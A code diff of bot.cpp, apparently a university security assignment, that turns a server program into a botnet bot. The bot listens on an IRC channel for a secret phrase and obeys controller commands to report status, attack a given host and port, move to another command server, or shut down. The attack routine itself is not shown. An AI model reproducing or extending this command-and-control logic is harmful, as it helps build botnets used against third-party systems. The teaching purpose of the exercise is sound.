@@ -1,5 +1,6 @@
 // File: bot.cpp
-// Desc: Handles Server-side functionality for secure data transfer with client program.
+// Desc: Handles Bot logic for BotNet.
+//			Listens for commands given with a secret phrase and parses valid commands.
 // Written by: James Cote
 // ID: 10146559
 // Tutorial: T01
@@ -61,7 +62,7 @@ int main( int iArgC, char* pArgs[] )
 	sChannel.assign( pArgs[ CHANNEL_ARG ] );
 
 	// init input handler.
-	pConnection = new connection( sHostName, iPort, sChannel );
+	pConnection = new connection( sHostName, iPort, sChannel, sMessage );
 
 	// Established socket
 	if ( pConnection->isConnected() )
@@ -89,6 +90,7 @@ int main( int iArgC, char* pArgs[] )
 	return 1;
 }
 
+// Parse Message, only handle if message was to the channel and secret phrase is found.
 bool handleMessage( const string& sMsg, const string& sPhrase )
 {
 	// Local Variables
@@ -96,29 +98,25 @@ bool handleMessage( const string& sMsg, const string& sPhrase )
 	vector< string > sSplitMsgs;
 	vector< string > sMessageDefs;
 	
+	// Break up and check Message Parameters
 	pConnection->splitString( sMsg, ':', sSplitMsgs );
+	pConnection->splitString( sSplitMsgs[ 0 ], ' ', sMessageDefs );
 
-	// Handle Ping
-	if( !sSplitMsgs[0].compare( "PING " ) )
-		pConnection->Socket_Write( "PONG :" + sSplitMsgs[ 1 ] + "\r\n" );
-	else
-	{
-		// Break up and check Message Parameters
-		pConnection->splitString( sSplitMsgs[ 0 ], ' ', sMessageDefs );
-
-		// General Message received? check for Secret Phrase and handle command if any
-		if ( !sMessageDefs[ 1 ].compare( sPRIVATEMSG ) && '#' == sMessageDefs[ 2 ][ 0 ] )	// Handle Potential Message
-			if ( string::npos != sSplitMsgs[ 1 ].find( sPhrase ) )							// Was the Secret Phrase found?
-				bReturnValue = handleCommand( sSplitMsgs[ 1 ], sSplitMsgs[ 0 ].substr( 0, sSplitMsgs[ 0 ].find_first_of( '!' ) ) /*Controller Name*/ );
-	}
+	// General Message received? check for Secret Phrase and handle command if any
+	if ( !sMessageDefs[ 1 ].compare( sPRIVATEMSG ) && '#' == sMessageDefs[ 2 ][ 0 ] )	// Handle Potential Message
+		if ( string::npos != sSplitMsgs[ 1 ].find( sPhrase ) )							// Was the Secret Phrase found?
+			bReturnValue = handleCommand( sSplitMsgs[ 1 ], sSplitMsgs[ 0 ].substr( 0, sSplitMsgs[ 0 ].find_first_of( '!' ) ) /*Controller Name*/ );
 	
 	return bReturnValue;
 }
 
+// Handle the command if plausibly valid command
 bool handleCommand( const string& sCommandString, string sControllerName )
 {
 	// Local Variables
 	bool bReturnValue = false;
+	int iPort;
+	char* p;
 	vector< string > sSplitCommand;
 	
 	// Split up command line arguments.
@@ -131,25 +129,48 @@ bool handleCommand( const string& sCommandString, string sControllerName )
 	{
 		if ( !iter->compare( sSTATUS ) )														// Handle Status
 		{
-			pConnection->sendStatusMsg( sControllerName );
+			pConnection->Socket_Write( "PRIVMSG " + sControllerName + " : Bot\n" );
 			break;
 		}
-		else if ( !iter->compare( sATTACK ) && (iter + NUM_ATK_ARGS != sSplitCommand.end()) )	// Handle Attack
+		else if ( !iter->compare( sATTACK )  )	// Handle Attack
 		{
-			if ( pConnection->attack( *(iter + 1), atoi( (iter + 2)->c_str() ) ) )
-				pConnection->Socket_Write( "PRIVMSG " + sControllerName + " :success\r\n" );
-			else
-				pConnection->Socket_Write( "PRIVMSG " + sControllerName + " :failure\r\n" );
+			// Check that number of arguments is correct.
+			if ( (iter + NUM_ATK_ARGS != sSplitCommand.end()) )
+			{
+				// Check that Port is a valid input
+				iPort = (int) strtol( (iter + 2)->c_str(), &p, 10 );
+
+				// Is it a valid input?
+				if ( 0 == *p )
+					pConnection->attack( *(iter + 1), iPort, sControllerName );
+				else
+					pConnection->Socket_Write( "PRIVMSG " + sControllerName + " : attack failed, invalid port\r\n" );
+			}
+			else // Not enough Arguments; report failure.
+				pConnection->Socket_Write( "PRIVMSG " + sControllerName + " : attack failed, invalid number of arguments\r\n" );
 			break;
 		}
-		else if ( !iter->compare( sMOVE ) && (iter + NUM_MOVE_ARGS != sSplitCommand.end()) )	// Handle Move
+		else if ( !iter->compare( sMOVE ) )	// Handle Move
 		{
-			handleMove( *(iter + 1), atoi( (iter + 2)->c_str() ), *(iter + 3), sControllerName );
+			// Check Number of Arguments
+			if ( (iter + NUM_MOVE_ARGS != sSplitCommand.end()) )
+			{
+				// Verify Port is valid input.
+				iPort = (int) strtol( (iter + 2)->c_str(), &p, 10 );
+
+				// Was it valid?
+				if ( 0 == *p )
+					handleMove( *(iter + 1), iPort, *(iter + 3), sControllerName );
+				else
+					pConnection->Socket_Write( "PRIVMSG " + sControllerName + " : move failed, invalid port\r\n" );
+			}
+			else // Wrong number of arguments? Respond with failure.
+				pConnection->Socket_Write( "PRIVMSG " + sControllerName + " : move failed, invalid number of parameters\r\n" );
 			break;
 		}
 		else if ( !iter->compare( sSHUTDOWN ) )													// Handle Shutdown
 		{
-			pConnection->Socket_Write( "PRIVMSG " + sControllerName + " :success\r\n" );
+			pConnection->Socket_Write( "PRIVMSG " + sControllerName + " : success\r\n" );
 			bReturnValue = true;
 			break;
 		}
@@ -162,14 +183,15 @@ bool handleCommand( const string& sCommandString, string sControllerName )
 void handleMove( const string& sHostName, int iPort, const string& sChannel, const string& sName )
 {
 	// Local Variables - try to set up the new connection
-	connection* pNewConnection = new connection( sHostName, iPort, sChannel );
+	string sErrMsg;
+	connection* pNewConnection = new connection( sHostName, iPort, sChannel, sErrMsg );
 
 	// Connection was successful?
 	if ( pNewConnection->isConnected() )
 	{
 		// Send success message and switch connection to new connection
 		pNewConnection->connectToServer( sPREFIX );
-		pConnection->Socket_Write( "PRIVMSG " + sName + " :success\r\n" );
+		pConnection->Socket_Write( "PRIVMSG " + sName + " : success\r\n" );
 		delete pConnection;
 		pConnection = pNewConnection;
 	}
@@ -177,6 +199,6 @@ void handleMove( const string& sHostName, int iPort, const string& sChannel, con
 	{
 		// delete failed connection and send failure message.
 		delete pNewConnection;
-		pConnection->Socket_Write( "PRIVMSG " + sName + " :failure\r\n" );
+		pConnection->Socket_Write( "PRIVMSG " + sName + " : failure, " + sErrMsg + "\r\n" );
 	}
 }
